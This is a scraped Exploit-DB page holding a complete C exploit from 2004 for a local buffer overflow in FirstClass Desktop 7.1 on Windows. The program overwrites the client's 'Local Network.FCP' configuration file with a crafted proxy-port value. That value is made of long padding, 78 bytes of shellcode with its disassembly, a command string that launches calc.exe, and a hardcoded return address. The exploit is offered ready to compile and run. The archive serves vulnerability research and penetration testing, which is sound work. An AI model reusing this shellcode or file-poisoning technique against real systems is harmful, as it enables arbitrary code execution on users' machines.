@@ -1,0 +1,2640 @@
+
+
+
+
+
+
+
+
+FirstClass Desktop 7.1 - Local Buffer Overflow - Windows local Exploit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }
+
+        function OptanonWrapper() { }
+    
+
+
+        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );
+
+        ga('send', 'pageview');
+    
+
+
+
+
+
+
+
+
+
+        .rbtn {
+            border: 2px solid white;
+            border-radius: 20px;
+            color: black;
+            padding: 8px;
+            cursor: pointer;
+        }
+
+        .rsuccess {
+            border-color: white;
+            color: white;
+        }
+
+        .rsuccess:hover {
+            background-color: white;
+            color: #165283;
+        }
+        .rprimary {
+            border-color: #ca4f0c;
+            color: #ca4f0c;
+        }
+
+        .rprimary:hover {
+            background-color: #ca4f0c;
+            color: white;
+        }
+    
+
+.action-link[data-v-7653bbea] {
+    cursor: pointer;
+}
+
+.action-link[data-v-04b7805e] {
+    cursor: pointer;
+}
+
+.action-link[data-v-7d22a50a] {
+    cursor: pointer;
+}
+
+
+
+
+
+
+             
+
+
+                Exploit Database
+            
+
+
+
+
+
+
+Exploits
+
+
+
+
+
+GHDB
+
+
+
+
+
+Papers
+
+
+
+
+
+Shellcodes
+
+
+
+
+
+
+
+
+Search EDB
+
+
+
+
+
+SearchSploit Manual
+
+
+
+
+
+Submissions
+
+
+
+
+
+
+
+
+Online Training 
+
+
+
+
+
+PWK
+ Penetration Testing with Kali 
+
+
+
+
+AWAE
+ Advanced Web Attacks 
+
+
+
+
+WiFu
+ Wireless Attacks 
+
+
+
+
+
+
+
+
+Offsec Resources
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Stats
+
+
+
+
+
+
+
+About Us
+
+
+
+
+                            About Exploit-DB
+                        
+
+                            Exploit-DB History
+                        
+
+                            FAQ
+                        
+
+
+
+
+
+
+Search
+
+
+
+
+
+
+GET CERTIFIED
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                FirstClass Desktop 7.1 - Local Buffer Overflow
+                            
+
+
+
+
+
+
+
+
+
+
+
+                                                                EDB-ID:
+                                                            
+
+                                                                172
+                                                            
+
+
+
+                                                                CVE:
+                                                            
+
+
+
+
+
+
+
+
+
+
+
+EDB Verified:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                Author:
+                                                            
+
+
+                                                                    I2S-LaB
+                                                                
+
+
+
+
+                                                                Type:
+                                                            
+
+
+                                                                    local
+                                                                
+
+
+
+
+
+
+
+
+
+
+Exploit: 
+
+
+
+                                                  /  
+                                                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                Platform:
+                                                            
+
+
+                                                                    Windows
+                                                                
+
+
+
+
+                                                                Date:
+                                                            
+
+                                                                2004-04-07
+                                                            
+
+
+
+
+
+
+
+
+
+Vulnerable App:
+
+
+
+
+
+
+
+
+
+
+Become a Certified Penetration Tester
+
+
+                                                        Enroll in
+                                                                                                                    
+                                                                Penetration Testing with Kali Linux
+                                                            
+
+                                                                                                                , the course
+                                                        required to become an
+                                                                                                                    Offensive Security Certified Professional (OSCP)
+                                                        
+
+                                                    
+
+
+
+
+GET CERTIFIED
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/***********************************************************
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+####################################################
+#           FirstClass Desktop 7.1 (latest) buffer overflow exploit               #
+####################################################
+Discovered and coded by I2S-LaB.
+
+URL     : http://www.I2S-LaB.com
+contact : contact[at]I2S-LaB.com
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+Compile it with cl.exe (VC++6)
+***********************************************************/
+
+#include <windows.h>
+
+void main (int argc, char *argv[])
+{
+
+	HANDLE FCP;	
+	DWORD NumberOfBytesWritten;
+	unsigned char *p, 
+
+		FC_FILE[] = "Local Network.FCP",
+		PATH[]   = "C:\\Program Files\\FirstClass\\Fcp\\",
+			
+		rawData[] =
+
+		/////////////////////////////////////////////////////////////////
+		// FC file data
+		/////////////////////////////////////////////////////////////////
+		"\x43\x4F\x4E\x4E\x54\x59\x50\x45\x20\x3D\x20\x38\x0D\x0A\x46\x43" 
+		"\x50\x45\x4E\x43\x52\x59\x50\x54\x20\x3D\x20\x31\x0D\x0A\x44\x4C"
+		"\x53\x45\x4E\x44\x20\x3D\x20\x30\x0D\x0A\x44\x4C\x45\x52\x52\x53"
+		"\x20\x3D\x20\x30\x0D\x0A\x44\x4C\x52\x43\x56\x20\x3D\x20\x30\x0D" 
+		"\x0A\x4D\x44\x4D\x44\x42\x47\x20\x3D\x20\x30\x0D\x0A\x53\x4C\x44" 
+		"\x42\x47\x20\x3D\x20\x30\x0D\x0A\x54\x43\x50\x54\x58\x57\x49\x4E" 
+		"\x20\x3D\x20\x31\x30\x30\x30\x30\x0D\x0A\x54\x43\x50\x52\x58\x42" 
+		"\x55\x46\x20\x3D\x20\x31\x30\x30\x30\x30\x0D\x0A\x54\x43\x50\x52" 
+		"\x45\x4D\x50\x4F\x52\x54\x20\x3D\x20\x35\x31\x30\x0D\x0A\x50\x52" 
+		"\x4F\x58\x59\x50\x4F\x52\x54\x20\x3D\x20\x22"
+		
+		/////////////////////////////////////////////////////////////////
+		// MASS NOP LIKE : 'A' = inc ecx
+		/////////////////////////////////////////////////////////////////
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		
+	
+		/*
+		 * Fcclient Specific shellcode [78 bytes]
+		 *****************************************************************
+			:00401006 EB47                    jmp 0040104F
+			:00401008 5A                      pop edx
+			:00401009 33FF                    xor edi, edi
+			:0040100B 8BEC                    mov ebp, esp
+			:0040100D 57                      push edi
+			:0040100E 52                      push edx
+			:0040100F 57                      push edi
+			:00401010 6845786563              push 63657845
+			:00401015 4F                      dec edi
+			:00401016 81EFFFA89691            sub edi, 9196A8FF
+			:0040101C 57                      push edi
+			:0040101D 68454C3332              push 32334C45
+			:00401022 684B45524E              push 4E52454B
+			:00401027 8D5DE4                  lea ebx, dword ptr [ebp-1C]
+			:0040102A 53                      push ebx
+			:0040102B 33FF                    xor edi, edi
+			:0040102D 81EF589D9DFF            sub edi, FF9D9D58
+			:00401033 FF17                    call dword ptr [edi]
+			:00401035 8D5DED                  lea ebx, dword ptr [ebp-13]
+			:00401038 53                      push ebx
+			:00401039 50                      push eax
+			:0040103A 6681F75103              xor di, 0351
+			:0040103F 4F                      dec edi
+			:00401040 FF17                    call dword ptr [edi]
+			:00401042 6A01                    push 00000001
+			:00401044 FF75F8                  push [ebp-08]
+			:00401047 FFD0                    call eax
+			:00401049 6683EF4C                sub di, 004C
+			:0040104D FFD7                    call edi
+			:0040104F E8B4FFFFFF              call 00401008
+			**********************************************************
+			*
+		 */
+
+		"\xEB\x47\x5A\x33\xFF\x8B\xEC\x57\x52\x57\x68\x45\x78\x65\x63\x4F"
+		"\x81\xEF\xFF\xA8\x96\x91\x57\x68\x45\x4C\x33\x32\x68\x4B\x45\x52" 
+		"\x4E\x8D\x5D\xE4\x53\x33\xFF\x81\xEF\x58\x9D\x9D\xFF\xFF\x17\x8D" 
+		"\x5D\xED\x53\x50\x66\x81\xF7\x51\x03\x4F\xFF\x17\x6A\x01\xFF\x75" 
+		"\xF8\xFF\xD0\x66\x83\xEF\x4C\xFF\xD7\xE8\xB4\xFF\xFF\xFF"
+ 
+		"calc.exe & " // to execute
+
+		////////////////////////////////////////////////////////////////
+		// OTHER DATA
+		////////////////////////////////////////////////////////////////
+		"\x22\x0A\x0D\x0A\x50\x52\x4F\x58\x59\x41\x44\x44\x52\x20" 
+		"\x3D\x20\x22\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x45\x45\x45" 
+		"\x45\x44\x44"
+
+		/////////////////////////////////////////////////////////////////
+		// Return Address
+		/////////////////////////////////////////////////////////////////
+		"\x5f\x75\xC2\x00";
+
+		// Banner
+		printf ("###############################################\n"
+			"FirstClass Client local buffer overflow Exploit\n"
+			"###############################################\n"
+			"Discovered & coded by I2S-LaB.\n\n"
+			"URL  : http://www.I2S-LaB.com\n"
+			"MAIL : Contact[at]I2S-LaB.com\n\n");
+
+
+		if ( !argv[1]) argv[1] = FC_FILE;
+
+		(argc > 2 ) ? (p = argv[2]) : (p = PATH);
+
+		if ( !(SetCurrentDirectory( p ) ) )
+		{
+			printf ("cannot set current directory to %s\nexiting.\n", p);
+			ExitProcess(0);
+		}
+
+		if (!lstrcmpi (argv[1], "/restore") )
+	
+			printf ("Restore the backup file...%s\n", 
+		CopyFile ("Local Network.BAK", FC_FILE, FALSE) ? "ok" : "Error : backup file not found!\n");
+
+		else if ( !lstrcmpi (argv[1], "/run"))
+		{
+			printf ("Saving the Local Network file...%s\n", 
+			CopyFile (FC_FILE, "Local Network.BAK", TRUE) ? "ok" : "Backup file cannot be made");
+
+
+			printf ("Opening the Local Network file...");
+				FCP = CreateFile (FC_FILE, GENERIC_WRITE, 
+						  FILE_SHARE_WRITE, NULL,
+						  OPEN_EXISTING,
+						  FILE_ATTRIBUTE_NORMAL,NULL);
+
+			if (FCP == INVALID_HANDLE_VALUE)
+			{
+				printf ("cannot open Local Network file, exiting!\n");
+				ExitProcess (-1);
+			}
+
+	printf ("ok\nWriting the Local Network File...%s\n",
+	WriteFile (FCP, rawData, strlen (rawData) + 1, &NumberOfBytesWritten, NULL) ? "ok" : "Write file error!");
+		}
+
+	else printf ("usage : %s /RUN | /RESTORE [path to Local Network.FCP]\n\n"
+	"/RUN     : launch the xploit against \"Local Network.FCP\"\n"
+	"/RESTORE : Restore the previous \"Local Network.FCP\"\n\n"
+	"[path to Local Network.FCP] : Optional,\ndefine the path of the \"Local Network.FCP\" to exploit.\n"
+	"Default is %s\n", argv[0], PATH);
+}
+
+
+
+
+// milw0rm.com [2004-04-07]
+            Copy
+
+
+
+
+Tags:
+
+
+
+
+
+Advisory/Source:
+
+                                        Link
+                                    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Downloads
+
+
+Certifications
+
+
+Training
+
+
+Professional Services
+
+
+
+
+
+
+
+                            Kali Linux
+                        
+
+
+OSCP
+                        
+
+
+Penetration Testing with Kali Linux (PWK)
+                        
+
+
+Penetration Testing
+                        
+
+
+
+
+
+                            Kali NetHunter
+                        
+
+
+OSWP
+                        
+
+
+Advanced Web Attacks and Exploitation (AWAE)
+                        
+
+
+Advanced Attack Simulation
+                        
+
+
+
+
+
+                            Kali Linux Revealed Book
+                        
+
+
+OSCE
+                        
+
+
+Offensive Security Wireless Attacks (WiFu)
+                        
+
+
+Application Security Assessment
+                        
+
+
+
+
+
+OSEE
+                        
+
+
+Cracking the Perimeter (CTP)
+                        
+
+
+
+
+
+
+OSWE
+                        
+
+
+Metasploit Unleashed (MSFU)
+                        
+
+
+
+
+
+
+KLCP
+                        
+
+
+
+                            Free Kali Linux Training
+                        
+
+
+
+
+
+
+
+
+
+
+                Downloads
+            
+
+
+                    Kali Linux
+                
+
+                    Kali NetHunter
+                
+
+                    Kali Linux Revealed Book
+                
+
+
+
+
+                Certifications
+            
+
+OSCP
+                
+OSWP
+                
+OSCE
+                
+OSEE
+                
+OSWE
+                
+KLCP
+                
+
+
+
+
+                Training
+            
+
+Penetration Testing with Kali Linux (PWK)
+                
+Advanced Web Attacks and Exploitation (AWAE)
+                
+Offensive Security Wireless Attacks (WiFu)
+                
+Cracking the Perimeter (CTP)
+                
+Metasploit Unleashed (MSFU)
+                
+
+                    Free Kali Linux training
+                
+
+
+
+
+                Pro Services
+            
+
+Penetration Testing
+                
+Advanced Attack Simulation
+                
+Application Security Assessment
+                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+                        Exploit Database by Offensive Security
+                    
+
+
+
+                        Terms
+                    
+
+
+
+                        Privacy
+                    
+
+
+
+                        About Us
+                    
+
+
+
+                        FAQ
+                    
+
+
+
+                        Cookies
+                    
+
+
+
+
+
+
+
+
+
+            ©
+            Copyright 2019, Exploit Database
+
+
+
+
+
+
+
+About The Exploit Database
+                
+
+×
+
+
+
+
+
+
+
+
+                        The Exploit Database is maintained by Offensive Security, an information security training company
+                        that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
+                        non-profit project that is provided as a public service by Offensive Security.
+                    
+The Exploit Database is a CVE
+                            compliant archive of public exploits and corresponding vulnerable software,
+                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
+                        the most comprehensive collection of exploits gathered through direct submissions, mailing
+                        lists, as well as other public sources, and present them in a freely-available and
+                        easy-to-navigate database. The Exploit Database is a repository for exploits and
+                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
+                        actionable data right away.
+                    
+The Google Hacking Database (GHDB)
+                        is a categorized index of Internet search engine queries designed to uncover interesting,
+                        and usually sensitive, information made publicly available on the Internet. In most cases,
+                        this information was never meant to be made public but due to any number of factors this
+                        information was linked in a web document that was crawled by a search engine that
+                        subsequently followed that link and indexed the sensitive information.
+                    
+The process known as “Google Hacking” was popularized in 2000 by Johnny
+                        Long, a professional hacker, who began cataloging these queries in a database known as the
+                        Google Hacking Database. His initial efforts were amplified by countless hours of community
+                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
+                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
+                        recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
+                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
+                        the fact that this was not a “Google problem” but rather the result of an often
+                        unintentional misconfiguration on the part of a user or a program installed by the user.
+                        Over time, the term “dork” became shorthand for a search query that located sensitive
+                        information and “dorks” were included with may web application vulnerability releases to
+                        show examples of vulnerable web sites.
+                    
+After nearly a decade of hard work by the community, Johnny turned the GHDB
+                        over to Offensive Security in November 2010, and it is now maintained as
+                        an extension of the Exploit Database. Today, the GHDB includes searches for
+                        other online search engines such as Bing,
+                        and other online repositories like GitHub,
+                        producing different, yet equally valuable results.
+                    
+
+
+
+Close
+                
+
+
+
+
+
+
+
+
+Offensive Security Resources
+                
+
+×
+
+
+
+
+
+
+Downloads
+Certifications
+Training
+Services
+
+
+
+
+
+
+                                        Kali Linux
+                                    
+
+
+OSCP
+                                    
+
+
+Penetration Testing with Kali Linux (PWK)
+                                    
+
+
+Penetration Testing
+                                    
+
+
+
+
+
+                                        Kali NetHunter
+                                    
+
+
+OSWP
+                                    
+
+
+Offensive Security Wireless Attacks (WiFu)
+                                    
+
+
+Advanced Attack Simulation
+                                    
+
+
+
+
+
+                                        Kali Linux Revealed Book
+                                    
+
+
+OSCE
+                                    
+
+
+Cracking the Perimeter (CTP)
+                                    
+
+
+Application Security Assessment
+                                    
+
+
+
+
+
+OSEE
+                                    
+
+
+Advanced Web Attacks (AWAE)
+                                    
+
+
+
+
+
+
+OSWE
+                                    
+
+
+Metasploit Unleashed (MSFU)
+                                    
+
+
+
+
+
+
+KLCP
+                                    
+
+
+
+                                        Free Kali Linux training
+                                    
+
+
+
+
+
+
+
+Close
+                
+
+
+
+
+
+
+
+
+
+Search The Exploit Database
+                
+
+×
+
+
+
+
+
+
+
+Title
+
+
+
+
+
+CVE
+
+
+
+
+
+
+Type
+
+
+
+                                        dos
+                                    
+
+                                        local
+                                    
+
+                                        remote
+                                    
+
+                                        shellcode
+                                    
+
+                                        papers
+                                    
+
+                                        webapps
+                                    
+
+
+
+Platform
+
+
+
+                                        AIX
+                                    
+
+                                        ASP
+                                    
+
+                                        BSD
+                                    
+
+                                        BSD_PPC
+                                    
+
+                                        BSD_x86
+                                    
+
+                                        BSDi_x86
+                                    
+
+                                        CGI
+                                    
+
+                                        FreeBSD
+                                    
+
+                                        FreeBSD_x86
+                                    
+
+                                        FreeBSD_x86-64
+                                    
+
+                                        Generator
+                                    
+
+                                        Hardware
+                                    
+
+                                        HP-UX
+                                    
+
+                                        IRIX
+                                    
+
+                                        JSP
+                                    
+
+                                        Linux
+                                    
+
+                                        Linux_MIPS
+                                    
+
+                                        Linux_PPC
+                                    
+
+                                        Linux_SPARC
+                                    
+
+                                        Linux_x86
+                                    
+
+                                        Linux_x86-64
+                                    
+
+                                        MINIX
+                                    
+
+                                        Multiple
+                                    
+
+                                        NetBSD_x86
+                                    
+
+                                        Novell
+                                    
+
+                                        OpenBSD
+                                    
+
+                                        OpenBSD_x86
+                                    
+
+                                        OSX_PPC
+                                    
+
+                                        OSX
+                                    
+
+                                        PHP
+                                    
+
+                                        Plan9
+                                    
+
+                                        QNX
+                                    
+
+                                        SCO
+                                    
+
+                                        SCO_x86
+                                    
+
+                                        Solaris
+                                    
+
+                                        Solaris_SPARC
+                                    
+
+                                        Solaris_x86
+                                    
+
+                                        Tru64
+                                    
+
+                                        ULTRIX
+                                    
+
+                                        Unix
+                                    
+
+                                        UnixWare
+                                    
+
+                                        Windows_x86
+                                    
+
+                                        Windows_x86-64
+                                    
+
+                                        Windows
+                                    
+
+                                        ARM
+                                    
+
+                                        CFM
+                                    
+
+                                        Netware
+                                    
+
+                                        SuperH_SH4
+                                    
+
+                                        Java
+                                    
+
+                                        BeOS
+                                    
+
+                                        Immunix
+                                    
+
+                                        Palm_OS
+                                    
+
+                                        AtheOS
+                                    
+
+                                        iOS
+                                    
+
+                                        Android
+                                    
+
+                                        XML
+                                    
+
+                                        Perl
+                                    
+
+                                        Python
+                                    
+
+                                        System_z
+                                    
+
+                                        JSON
+                                    
+
+                                        ASHX
+                                    
+
+                                        Ruby
+                                    
+
+                                        ASPX
+                                    
+
+                                        macOS
+                                    
+
+                                        Linux_CRISv32
+                                    
+
+                                        eZine
+                                    
+
+                                        Magazine
+                                    
+
+                                        NodeJS
+                                    
+
+                                        Alpha
+                                    
+
+                                        Solaris_MIPS
+                                    
+
+                                        Lua
+                                    
+
+                                        watchOS
+                                    
+
+                                        VxWorks
+                                    
+
+
+
+
+Author
+
+
+
+
+
+
+
+Content
+
+
+
+
+Port
+
+
+
+                                        14
+                                    
+
+                                        21
+                                    
+
+                                        22
+                                    
+
+                                        23
+                                    
+
+                                        25
+                                    
+
+                                        42
+                                    
+
+                                        49
+                                    
+
+                                        53
+                                    
+
+                                        66
+                                    
+
+                                        69
+                                    
+
+                                        70
+                                    
+
+                                        79
+                                    
+
+                                        80
+                                    
+
+                                        81
+                                    
+
+                                        102
+                                    
+
+                                        105
+                                    
+
+                                        110
+                                    
+
+                                        111
+                                    
+
+                                        113
+                                    
+
+                                        119
+                                    
+
+                                        123
+                                    
+
+                                        135
+                                    
+
+                                        139
+                                    
+
+                                        143
+                                    
+
+                                        161
+                                    
+
+                                        162
+                                    
+
+                                        164
+                                    
+
+                                        383
+                                    
+
+                                        389
+                                    
+
+                                        402
+                                    
+
+                                        406
+                                    
+
+                                        411
+                                    
+
+                                        443
+                                    
+
+                                        444
+                                    
+
+                                        445
+                                    
+
+                                        446
+                                    
+
+                                        502
+                                    
+
+                                        504
+                                    
+
+                                        513
+                                    
+
+                                        514
+                                    
+
+                                        515
+                                    
+
+                                        532
+                                    
+
+                                        548
+                                    
+
+                                        554
+                                    
+
+                                        555
+                                    
+
+                                        617
+                                    
+
+                                        623
+                                    
+
+                                        631
+                                    
+
+                                        655
+                                    
+
+                                        689
+                                    
+
+                                        783
+                                    
+
+                                        787
+                                    
+
+                                        808
+                                    
+
+                                        873
+                                    
+
+                                        888
+                                    
+
+                                        901
+                                    
+
+                                        998
+                                    
+
+                                        1000
+                                    
+
+                                        1040
+                                    
+
+                                        1089
+                                    
+
+                                        1099
+                                    
+
+                                        1100
+                                    
+
+                                        1114
+                                    
+
+                                        1120
+                                    
+
+                                        1194
+                                    
+
+                                        1235
+                                    
+
+                                        1471
+                                    
+
+                                        1521
+                                    
+
+                                        1533
+                                    
+
+                                        1581
+                                    
+
+                                        1589
+                                    
+
+                                        1604
+                                    
+
+                                        1617
+                                    
+
+                                        1723
+                                    
+
+                                        1743
+                                    
+
+                                        1761
+                                    
+
+                                        1812
+                                    
+
+                                        1858
+                                    
+
+                                        1861
+                                    
+
+                                        1900
+                                    
+
+                                        1947
+                                    
+
+                                        2000
+                                    
+
+                                        2022
+                                    
+
+                                        2049
+                                    
+
+                                        2100
+                                    
+
+                                        2103
+                                    
+
+                                        2121
+                                    
+
+                                        2125
+                                    
+
+                                        2181
+                                    
+
+                                        2242
+                                    
+
+                                        2315
+                                    
+
+                                        2375
+                                    
+
+                                        2380
+                                    
+
+                                        2381
+                                    
+
+                                        2401
+                                    
+
+                                        2480
+                                    
+
+                                        2525
+                                    
+
+                                        2640
+                                    
+
+                                        2810
+                                    
+
+                                        2812
+                                    
+
+                                        2947
+                                    
+
+                                        2954
+                                    
+
+                                        2990
+                                    
+
+                                        3000
+                                    
+
+                                        3030
+                                    
+
+                                        3050
+                                    
+
+                                        3052
+                                    
+
+                                        3128
+                                    
+
+                                        3129
+                                    
+
+                                        3181
+                                    
+
+                                        3200
+                                    
+
+                                        3217
+                                    
+
+                                        3306
+                                    
+
+                                        3333
+                                    
+
+                                        3378
+                                    
+
+                                        3389
+                                    
+
+                                        3460
+                                    
+
+                                        3465
+                                    
+
+                                        3500
+                                    
+
+                                        3535
+                                    
+
+                                        3632
+                                    
+
+                                        3690
+                                    
+
+                                        3790
+                                    
+
+                                        3814
+                                    
+
+                                        3817
+                                    
+
+                                        4000
+                                    
+
+                                        4002
+                                    
+
+                                        4070
+                                    
+
+                                        4081
+                                    
+
+                                        4105
+                                    
+
+                                        4111
+                                    
+
+                                        4322
+                                    
+
+                                        4343
+                                    
+
+                                        4434
+                                    
+
+                                        4501
+                                    
+
+                                        4555
+                                    
+
+                                        4592
+                                    
+
+                                        4661
+                                    
+
+                                        4750
+                                    
+
+                                        4848
+                                    
+
+                                        5000
+                                    
+
+                                        5060
+                                    
+
+                                        5061
+                                    
+
+                                        5080
+                                    
+
+                                        5081
+                                    
+
+                                        5093
+                                    
+
+                                        5151
+                                    
+
+                                        5180
+                                    
+
+                                        5247
+                                    
+
+                                        5250
+                                    
+
+                                        5272
+                                    
+
+                                        5308
+                                    
+
+                                        5432
+                                    
+
+                                        5466
+                                    
+
+                                        5554
+                                    
+
+                                        5555
+                                    
+
+                                        5600
+                                    
+
+                                        5655
+                                    
+
+                                        5666
+                                    
+
+                                        5800
+                                    
+
+                                        5803
+                                    
+
+                                        5814
+                                    
+
+                                        5858
+                                    
+
+                                        5900
+                                    
+
+                                        5984
+                                    
+
+                                        6066
+                                    
+
+                                        6070
+                                    
+
+                                        6080
+                                    
+
+                                        6082
+                                    
+
+                                        6101
+                                    
+
+                                        6112
+                                    
+
+                                        6129
+                                    
+
+                                        6379
+                                    
+
+                                        6502
+                                    
+
+                                        6503
+                                    
+
+                                        6660
+                                    
+
+                                        6667
+                                    
+
+                                        7001
+                                    
+
+                                        7002
+                                    
+
+                                        7070
+                                    
+
+                                        7071
+                                    
+
+                                        7080
+                                    
+
+                                        7100
+                                    
+
+                                        7144
+                                    
+
+                                        7210
+                                    
+
+                                        7272
+                                    
+
+                                        7290
+                                    
+
+                                        7426
+                                    
+
+                                        7443
+                                    
+
+                                        7510
+                                    
+
+                                        7547
+                                    
+
+                                        7649
+                                    
+
+                                        7770
+                                    
+
+                                        7777
+                                    
+
+                                        7778
+                                    
+
+                                        7787
+                                    
+
+                                        7879
+                                    
+
+                                        7902
+                                    
+
+                                        8000
+                                    
+
+                                        8001
+                                    
+
+                                        8002
+                                    
+
+                                        8004
+                                    
+
+                                        8008
+                                    
+
+                                        8020
+                                    
+
+                                        8022
+                                    
+
+                                        8023
+                                    
+
+                                        8028
+                                    
+
+                                        8030
+                                    
+
+                                        8080
+                                    
+
